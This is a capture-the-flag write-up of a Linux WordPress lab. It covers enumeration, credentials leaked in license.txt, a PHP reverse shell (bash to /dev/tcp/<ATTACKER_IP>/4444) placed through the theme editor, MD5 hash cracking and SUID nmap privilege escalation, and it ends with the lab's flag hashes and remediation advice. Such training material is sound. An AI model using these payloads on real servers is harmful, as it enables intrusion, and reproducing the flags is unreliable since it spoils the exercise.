
**Difficulty:** Medium **OS:** Linux (Ubuntu 20.04) **Keys:** 3/3

---

## Room Summary

| Field                | Detail                             |
| -------------------- | ---------------------------------- |
| Platform             | TryHackMe                          |
| Difficulty           | Medium                             |
| OS                   | Linux (Ubuntu 20.04)               |
| Services             | SSH (22), HTTP (80), HTTPS (443)   |
| Initial Access       | WordPress Admin → Theme Editor RCE |
| Privilege Escalation | SUID nmap --interactive            |
| Keys Found           | 3 / 3                              |

---

## Attack Chain Overview

1. Enumeration — nmap, robots.txt, gobuster
2. Credential Discovery — base64 creds in license.txt
3. Initial Access — WordPress admin theme editor PHP reverse shell
4. Lateral Movement — MD5 hash crack → ssh as robot
5. Privilege Escalation — SUID nmap --interactive → root

---

## Phase 1: Enumeration

### 1.1 Nmap Scan

```bash
sudo nmap -sC -sV -T4 --min-rate=1000 <TARGET_IP>
```

**Results:**

- Port 22 — OpenSSH 8.2p1 (Ubuntu)
- Port 80 — Apache HTTP
- Port 443 — Apache HTTPS (self-signed cert, www.example.com)
- No version banner on Apache — `X-Mod-Pagespeed` header present

### 1.2 robots.txt

```bash
curl http://<TARGET>/robots.txt
```

Two critical files exposed:

- `fsocity.dic` — wordlist for credential attacks
- `key-1-of-3.txt` — **Flag 1**

Download and deduplicate the wordlist:

```bash
wget http://<TARGET>/fsocity.dic
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic
# 858,160 lines → 11,451 unique
```

### 1.3 Tech Stack Fingerprinting

```bash
whatweb http://<TARGET>
curl -sI http://<TARGET>
curl -s http://<TARGET>/ | head -50
```

Confirmed: Apache + mod_pagespeed. No CMS fingerprint from homepage (cached static HTML).

### 1.4 Directory Enumeration

```bash
gobuster dir -u http://<TARGET> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html \
  -t 50
```

**Key findings:**

|Path|Status|Notes|
|---|---|---|
|/wp-login.php|200|WordPress login|
|/wp-content/|301|Confirms WordPress|
|/wp-includes/|301|Confirms WordPress|
|/login|302|Redirects to /wp-login.php|
|/license.txt|200|Contains credentials|
|/admin|200|WordPress admin panel|

---

## Phase 2: Credential Discovery

### 2.1 license.txt

```bash
curl http://<TARGET>/license.txt
# Returns base64 string: ZWxsaW90OkVSMjgtMDY1Mgo=

echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
# elliot:ER28-0652
```

### 2.2 WordPress Login

Logged into `/wp-login.php` with `elliot:ER28-0652`.

- **User:** Elliot Alderson (admin)
- **WordPress version:** 4.3.1
- **Active theme:** Twenty Fifteen

---

## Phase 3: Initial Access — PHP Reverse Shell

### 3.1 Theme Editor Injection

Navigate to: `Appearance → Editor → Theme Functions (functions.php)`

Add reverse shell at the top of `functions.php` inside the opening `<?php` tag:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
```

### 3.2 Important Caveats

> **mod_pagespeed caches the homepage** — do NOT trigger via `/` or a 404 page. Use `wp-login.php` instead as it bypasses the cache.

> Direct file access to `.php` theme files returns empty — must trigger through the WordPress router.

### 3.3 Catching the Shell

```bash
# Listener
nc -lvnp 4444

# Trigger (bypasses mod_pagespeed cache)
curl http://<TARGET>/wp-login.php
```

Shell lands as: `daemon`

### 3.4 Shell Stabilisation

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Phase 4: Lateral Movement — robot

### 4.1 Enumeration as daemon

```bash
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home/robot/
```

```
-r-------- 1 robot robot   33  key-2-of-3.txt   # no read as daemon
-rw-r--r-- 1 robot robot   39  password.raw-md5  # world-readable
```

### 4.2 Hash Cracking

```bash
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b

echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt --show
# c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

### 4.3 Lateral Move

SSH directly (cleaner than `su` in an unstable shell):

```bash
ssh robot@<TARGET>
# password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
```

---

## Phase 5: Privilege Escalation — SUID nmap

### 5.1 SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Notable result: `/usr/local/bin/nmap` — SUID bit set.

### 5.2 Version Check

```bash
nmap --version
# Version 3.81 — vulnerable range is 2.02–5.21
```

### 5.3 Exploitation (GTFOBins)

```bash
nmap --interactive
nmap> !sh
# root shell
whoami
# root
```

### 5.4 Key 3

```bash
cat /root/key-3-of-3.txt
```

---

## Keys

|Key|Location|Hash|
|---|---|---|
|Key 1|/key-1-of-3.txt (robots.txt)|073403c8a58a1f80d943455fb30724b9|
|Key 2|/home/robot/key-2-of-3.txt|822c73956184f694993bede3eb39f959|
|Key 3|/root/key-3-of-3.txt|04787ddef27c3dee1ee161b21670b4e4|

---

## Remediation

- `robots.txt` must never reference sensitive files
- Credentials must never be stored in publicly accessible files
- WordPress 4.3.1 is severely outdated — update immediately
- Disable the theme/plugin editor in wp-config.php: `define('DISALLOW_FILE_EDIT', true)`
- MD5 is broken — use bcrypt or Argon2 for password hashing
- Never set SUID on scripting-capable binaries like nmap
- Audit SUID binaries regularly: `find / -perm -4000 -type f 2>/dev/null`